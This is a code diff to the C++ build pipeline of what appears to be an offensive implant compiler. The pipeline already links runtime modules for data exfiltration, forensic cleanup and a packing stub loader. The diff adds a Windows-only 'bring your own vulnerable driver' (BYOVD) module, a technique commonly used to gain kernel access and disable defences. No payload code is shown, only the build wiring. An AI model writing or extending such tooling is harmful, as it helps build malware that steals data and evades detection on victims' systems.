@@ -414,7 +414,7 @@ bool Pipeline::compileToObject(const CompileOptions& opts, const std::string& bc
 }
 
 bool Pipeline::compileRuntime(const std::string& clang, const std::string& outDir,
-                              std::vector<std::string>& outObjs, const std::string& targetFlag, bool noRuntime) {
+                              std::vector<std::string>& outObjs, const std::string& targetFlag, bool noRuntime, bool byovd) {
     namespace fs = std::filesystem;
 
     fs::path compilerSrc = fs::path(__FILE__).parent_path().parent_path();
@@ -481,6 +481,12 @@ bool Pipeline::compileRuntime(const std::string& clang, const std::string& outDi
         sources.push_back(runtimeDir / "exfil"        / "exfil.c");
         sources.push_back(runtimeDir / "cleanup"      / "forensics.c");
         sources.push_back(runtimeDir / "pack"         / "stub_loader.c");
+    }
+
+    if (byovd && isWindowsTarget) {
+        fs::path byovdDir = runtimeDir / "byovd";
+        incFlags += " -I" + byovdDir.string();
+        sources.push_back(byovdDir / "byovd_modular.c");
     }
 
     for (const auto& src : sources) {
@@ -565,7 +571,7 @@ bool Pipeline::run(const CompileOptions& opts) {
     if (!opts.noRuntime) {
         std::cout << "[*] Compiling runtime library...\n";
         std::filesystem::create_directories(outDir);
-        if (!compileRuntime(clang, outDir, runtimeObjs, targetFlag, opts.noRuntime)) {
+        if (!compileRuntime(clang, outDir, runtimeObjs, targetFlag, opts.noRuntime, opts.byovd)) {
             std::cerr << "[!] Runtime compilation failed\n";
             return false;
         }
